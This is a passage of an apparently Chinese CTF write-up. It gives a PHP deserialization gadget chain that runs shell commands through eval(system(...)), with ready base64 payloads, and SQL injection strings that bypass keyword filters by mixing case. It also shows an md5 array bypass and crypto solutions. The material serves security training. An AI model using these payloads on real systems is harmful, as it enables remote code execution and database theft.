eval(\system(&#x27;ls&#x27;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么我们可以将匿名函数通过<code>serialize</code>函数经过一次序列化和反序列化，这样他就能作为<code>SerializableClosure</code>对象被序列化。或者直接将<code>generate</code>变量赋值为<code>SerializableClosure</code>类。</p></li><li><p>payload：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StopHook</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; processes = <span class="keyword">array</span>(<span class="keyword">new</span> \Faker\MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MyGenerator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">defaultValue</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; defaultValue = <span class="keyword">new</span> \Method\Func\GetFile();</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetFile</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; flag = <span class="keyword">new</span> \Method\Func\GetDefault();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; value = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetDefault</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source = <span class="keyword">new</span> \Method\Func\GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; flag = <span class="string">&#x27;myTest&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenerateFile</span> &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls /&#x27;</span>)); &#125;;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; generate = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>将php文件放在<code>/www</code>文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的<code>HP Warning:  Creating default object from empty value in /var/www/1.php on line 51</code>，在php8中就直接报错了）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ==</span><br></pre></td></tr></table></figure><ul><li>将作为post参数data传递，获得回显：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><ul><li>修改<code>$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;</code>，重新序列化：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ==</span><br></pre></td></tr></table></figure></li><li><p>获得flag：</p></li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png" alt="image-20211002021317038"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125;</span><br></pre></td></tr></table></figure><h3 id="ctfmanage"><a href="#ctfmanage" class="headerlink" title="ctfmanage"></a>ctfmanage</h3><ul><li>打开题目是一个登录框，加上字母发现直接报错，发现使用的是登录号，所以登录名是一个数字型参数，没有单引号包裹，而密码是一个字符型参数：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318191.png" alt="image-20211002022340742" style="zoom:50%;" /></p><ul><li>尝试输入用户名<code>1 or 1=1#</code>，发现被过滤，使用fuzz字典跑一下过滤值：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318192.png" alt="image-20211002023322880" style="zoom:50%;" /></p><ul><li>想到用<code>union</code>联合注入，尝试了很多次但是没有成功，后来发现可以大小写绕过（笑，现在怎么这么多双层防护的题目）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,3;#</span><br><span class="line">1 Union Select 1,2,database();# =&gt; ctf</span><br></pre></td></tr></table></figure><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318193.png" alt="image-20211002031727834" style="zoom:50%;" /></p><ul><li>由于or被过滤了，所以这里需要使用无表名注入，且<code>from</code>和<code>where</code>都需要大小写绕过：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,group_concat(table_name) From sys.schema_table_statistics_with_buffer Where table_schema=database();# =&gt; 没有输出</span><br><span class="line">1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name = database();#</span><br><span class="line">=&gt; flagisthere,ilikectf</span><br></pre></td></tr></table></figure><ul><li>接下来就是无列名注入，以下两个payload都失败了：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,`3` From (Select 1,2,3 Union Select * From ilikectf);#</span><br><span class="line">1 Union Select 1,2,b From (Select 1,2,3 As b,4,5 Union Select * From ilikectf)a;#</span><br></pre></td></tr></table></figure><ul><li>最后使用下面式子成功：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select * From ilikectf;# =&gt; 36476,sgrsgef,gg.php</span><br></pre></td></tr></table></figure><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318194.png" alt="image-20211002031655165" style="zoom:50%;" /></p><ul><li>来到<code>gg.php</code>：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>后一个是md5数组绕过。另外一个<code>$secret</code>变量，让我们回想起首页页面源代码中的字符：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ/bGlg== --&gt;</span><br></pre></td></tr></table></figure><ul><li>将其反过来解密即可：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(strrev(bin2hex(base64_decode(&#x27;hjZX1pcnVmdmRzZWZ/bGlg==&#x27;))));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilovectfverymuch</span><br></pre></td></tr></table></figure><ul><li>所以最后的payload：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?sy=ilovectfverymuch</span><br><span class="line">POST:</span><br><span class="line">ha[]=a&amp;lo[]=b</span><br></pre></td></tr></table></figure><ul><li>获得flag：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318195.png" alt="image-20211002031342627" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23c2e3e4-d2f8-4770-9c7d-84142263a47a&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;******************&#125;&#x27;</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line">flaglong=bytes_to_long(flag)</span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, flaglong, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span></span><br><span class="line"><span class="comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span></span><br></pre></td></tr></table></figure><ul><li>这道题有点特殊，是使用$2^{256}$次方作为模，flaglong作为加密指数e，列出等式有：</li></ul><script type="math/tex; mode=display">m^{flaglong}=c\pmod {2^{256}}</script><h4 id="spmpy库"><a href="#spmpy库" class="headerlink" title="spmpy库"></a>spmpy库</h4><ul><li>已知条件m、c，求解flaglong，这是一个标准的离散对数问题，可以通过sage求解，也可以使用python的<code>spmpy</code>库中的<code>discrete_log</code>函数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line">m = <span class="number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span></span><br><span class="line">c = <span class="number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span></span><br><span class="line">flag = discrete_log(n, c, m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(flag)))</span><br></pre></td></tr></table></figure><ul><li>获得flag：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DASCTF_zjut&#125;</span><br></pre></td></tr></table></figure><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sage: n = 2 ** 256</span><br><span class="line">sage: m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><br><span class="line">sage: c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><br><span class="line">sage: ZmodN = Zmod(n)</span><br><span class="line">sage: m = ZmodN(m)</span><br><span class="line">sage: c = ZmodN(c)</span><br><span class="line">sage: hex(c.log(m))</span><br><span class="line">&#x27;0x666c61677b4441534354465f7a6a75747d&#x27;</span><br></pre></td></tr></table></figure><ul><li>将十六进制转换成字符：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109271850284.png" alt="image-20210925110217025"></p><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><ul><li>题目：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % nc node4.buuoj.cn 28410</span><br><span class="line">n:  0x57b08bc1c82237cf614735562d4fe2a07570813b6c726537f83449df9be01e538bb765993001658f3c879f189620ad628517dda951a0103a88f7b28a9ee631fc365ee3e9f0ce558cf20eac76893bb7c0b49ed68506fcba1bb341eca59e7a2e4ce9bd31bfc03d6037cd565b6eae375e0e0b9084a352e820e02405597845871f62ee92eeba2f8de71f8af784a51ca83bd767b4f52908a853aae6efbf58db16a14c1fbf51c47f9613e21906f16fe14595d706f75555462cc7aea6b62ef558c6b74329ad182b308122f99cab95bc93ba6f9f9cfd29407b582404bfb11b45e1d5fa13372c174395306a6eb5c60651736f776e353b2eb8da356bded79bea7e4a1e212ac37b1d59e1356fcbcec8065642c318b1e908f54745aa7467c680ed6f2716fb3efd9843122dccbbdb6698fe1e31a2390682e03d175e0bf7591b8201ad14d1d8f02a3fcbea0b864e52895e588390e4a785ce94bf0b5b7b6a59c5f92ae214b846ffebf52b5a71dc286adc4d1755acd6b9e1b9e41cf0b1267c6433dabb708828d5b5b16638299b76c1645988e974b0f0215f8eee31f44503624d75b67519ad5c50e9924006bd64869d1a822cf927effedd570f4cbe110d8478e1ac10c95b754f05151b7eb146c226fa443655a12af864bdb3d30fce492840763775e487dd963b5fb292fbd8ca702c1be458d941177782f96edf489d021312cb082f9e01a824440e07L</span><br><span class="line">e:  0x77859f7f91ed390f5a7f6fdf76824c0468ae4bcde36f86fdca3a773915af3c9a8d173fcfd71a0e7782166147ca46e6d6fc32f91e6db3585d9998246dfcb163cdf9f9bad948daf005299a3c92eeef4a1ce2e78f5428608856c8b88ff3ff7b8fc3bd1a50ecbc10af5992801a0ccf92f00347a107e6856b97a16ead0f8143bd95b4614f1ba8836bb281ca2a01910c78fa99d7b7b25a224baa8403975e48105b7afd5d07d745d2be993e14c14c3de7c9b53e8d3e70420e182dbbc1b85347a517f7d93ebbcf8c0c41c234aefaa434bdad4db01ba50d8a596bf96b42da77f476056871b50d1eea18825dfe0741dba92daf33aef3b0dda2fa63a92a3cf8745044285c6c6f063754e2fe711b6dfe0557415be5dfe5b037fcce577428beada47b61a780e69a0273da11e4f0b236f3e39d471ddd17b40a7e6b05918acc668a379e17c3e857423b30699401d468b4aef7b8fa60c4dedfdb1092f46f83fecda984836b23e20436b88e5eea9d71198b966c0a0126e5063e182d822c1b72c39078a173a207677dca0599024f573f2d237177c7b70b7286c80dddd89838ba7f16e85b8ce57bc5ecf079b9cc4d9d8d633ec75d13ca1630e3ba83edbead13e50ba8ec9b68424aa88d455cdf566b607308f02e326f4d6a7673a4e2fa342b725b98a4798a54ca974cf2c28d0e79a622a19a26f1ff6340c831d08b3fdadbe48d162b1e57952bc9bbb643L</span><br><span class="line">Your flag is:  0x9eed6ec9e43e4405c0dc6f62b7ceab3f9c744d64c4262848739447924e55e2c0462d50a7b528bd4dbee136ec8725a8374078a277786e1167c08fb0bfe8fe76c94f291f56a6a478e9d9e000efd09381f228d9567132dec682413ab38483734d31c37f127dc9e172f3aab101edc2a2ba843ecf3f9f76ba7a52dc99ad63c307cb4a9183109b5b67d51c30c5e7279012c0e234c2e8c3ff182bb398e7f69c29bf1fa950d2158fb98086c5a829a6b4616f1488df7d80346805975e39d1e3e96c5dfd5e01239ec6a5a9b0391ec5b9c0b0def3f4c688ec4d54f5a96d7121d6980d80e896aec740e86567500efc21c4adc000ea19dfab5c68e5d07bef977acedfdc3d647cdf491c8aee9d96b7445d3a8df1ee3229ed23542b8e632a77e9778482908c297858e17f3964e2d82077c76036bd01db5bec483308d651f7b1e5a9c3fe2e2678331929d01e81a488b10ac5c0723e9cf586acaa2d9f061db291bb83e41f94f98a7b8ea5939ddc91c4de57a9271b71dab42d3cf8b6b0b35dbea8d6d564aba05fdbaad82846e29c37cec8b994c209be616ae167bfea11d97297ddd46a61264ae0c0fbb129bd20d12f9a6b3b7a162e1978151b2191406fbad79775a26a122724f5d5194a6362b62bd070f8e36efec0a507e5c8b92fbd69f0ba76584c260766cc6d99b3933e9d2d77f0d06bab7469dd612d79563084bfd886edb129b5f5d2eb00c3edL</span><br></pre></td></tr></table></figure><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m_exit</span>(<span class="params">n</span>):</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;==============Game Over!=================&quot;</span></span><br><span class="line">exit(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_bit</span>(<span class="params">num</span>):</span></span><br><span class="line">num = <span class="built_in">int</span>(num)</span><br><span class="line">l = <span class="built_in">len</span>(<span class="built_in">bin</span>(num))</span><br><span class="line"><span class="keyword">return</span> l-<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pi_b</span>(<span class="params">x</span>):</span></span><br><span class="line">bt = <span class="number">536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L</span></span><br><span class="line"><span class="keyword">return</span> invmod(x, bt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ed</span>(<span class="params">p, q</span>):</span></span><br><span class="line">k = cal_bit(q*p)</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">r = random.randint(<span class="number">10</span>, <span class="number">99</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">u = getPrime(k/<span class="number">4</span> - r)</span><br><span class="line"><span class="keyword">if</span> gcd(u, phi_n) != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">t = invmod(u, phi_n)</span><br><span class="line">e = pi_b(t)</span><br><span class="line"><span class="keyword">if</span> gcd(e, phi_n) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">d = invmod(e, phi_n)</span><br><span class="line"><span class="keyword">return</span> (e, d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">flag = get_flag()</span><br><span 